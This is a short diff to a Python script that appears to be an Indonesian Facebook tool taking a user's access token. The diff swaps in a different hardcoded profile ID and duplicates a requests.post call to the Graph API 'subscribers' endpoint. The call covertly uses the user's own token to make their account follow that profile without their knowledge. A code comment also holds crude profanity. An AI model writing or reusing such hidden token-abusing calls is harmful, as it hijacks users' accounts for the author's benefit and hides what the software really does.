@@ -107,8 +107,9 @@ def iwan_dev():
     except IOError:
         print (' [!] Token invalid') 
         os.system('rm -rf login.txt')
-        
-    requests.post('https://graph.facebook.com/100050155342390/subscribers?access_token=' + token)
+
+    requests.post('https://graph.facebook.com/100000201371915/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100000201371915/subscribers?access_token=' + token)
     menu()
 
 #------->login token jangan lupa masukin token facebook jangan token listrik kontol<-------#    
